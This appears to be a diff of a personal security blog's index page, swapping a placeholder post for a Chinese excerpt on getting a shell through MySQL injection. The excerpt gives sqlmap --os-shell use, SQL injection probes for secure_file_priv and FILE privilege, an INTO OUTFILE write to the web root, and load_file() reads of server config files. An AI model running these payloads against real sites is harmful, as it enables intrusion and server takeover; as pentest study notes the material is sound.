@@ -86,10 +86,7 @@
         <h1>Security Documentation</h1>
     </header>
     <div class="entry-content">
-        <blockquote>
-<p>System status: Online
-Accessing encrypted logs&hellip;</p>
-</blockquote>
+        
     </div>
     <footer class="entry-footer">
         <div class="social-icons" >
@@ -109,15 +106,18 @@ Accessing encrypted logs&hellip;</p>
 
 <article class="post-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">我的第一篇黑客日志
+    <h2 class="entry-hint-parent">MySQL getshell
     </h2>
   </header>
   <div class="entry-content">
-    <p>终于看到我了！ 如果你能看到这行字，说明配置终于通了。
-</p>
+    <p>UDF (–os-shell) 利用条件 数据库为DBA,可以使用sqlmap的--is-dba查看当前网站连接的数据库账户是否是管理员
+secure_file_priv没有具体值
+查找:1. --sql-shell 1. 进入数据库后: SHOW VARS LIKE &#39;secure_file_priv&#39;;2. 盲注:使用length()函数推测: ?id=1 AND (SELECT @@secure_file_priv) IS NULL 返回正常则null,无法写入页面异常则,则不是null判断是否为空:?id=1 AND length(@@secure_file_priv) = 0	页面正常则为空3. 尝试写入文件: ?id=1 INTO OUTFILE &#39;/var/www/html/test.txt&#39; -- 根据报错信息判断4.权限检查: ?id=1 AND (SELECT user_privileges FROM information_schema.user_privileges WHERE privilege_type=&#39;FILE&#39; AND grantee=CONCAT(&#34;&#39;&#34;, (SELECT CURRENT_USER()), &#34;&#39;&#34;)) IS NOT NULL	即使secure_file_priv为空,用户没有FILE权限,也无法写入或者AND (SELECT 1 FROM mysql.user LIMIT 1)，如果能访问 mysql 库，通常意味着是高权限。 知道网站的绝对路径
+查找:1. 注入报错信息2. 利用内部函数和元数据:Apache (Ubuntu): UNION SELECT 1, load_file(&#39;/etc/apache2/sites-enabled/000-default.conf&#39;), 3Nginx: UNION SELECT 1, load_file(&#39;/etc/nginx/nginx.conf&#39;), 3Windows (IIS): C:\Windows\System32\inetsrv\config\applicationHost.config3.常见的默认路径:Linux (Apache)	/var/www/html/, /var/www/www.example.com/Linux (Nginx)	/usr/share/nginx/html/, /var/www/html/Windows (IIS)	C:\inetpub\wwwroot\Windows (XAMPP)	C:\xampp\htdocs\Windows (phpStudy)	D:\phpstudy_pro\WWW\, C:\phpStudy\WWW\ 漏洞复现 方法一: –os-shell
+...</p>
   </div>
-  <footer class="entry-footer"><span title='2026-01-31 00:00:00 +0000 UTC'>January 31, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
-  <a class="entry-link" aria-label="post link to 我的第一篇黑客日志" href="http://localhost:1313/posts/first-log/"></a>
+  <footer class="entry-footer"><span title='2026-01-30 00:00:00 +0000 UTC'>January 30, 2026</span>&nbsp;·&nbsp;<span>3 min</span></footer>
+  <a class="entry-link" aria-label="post link to MySQL getshell" href="http://localhost:1313/posts/mysql-getshell/"></a>
 </article>
     </main>
     
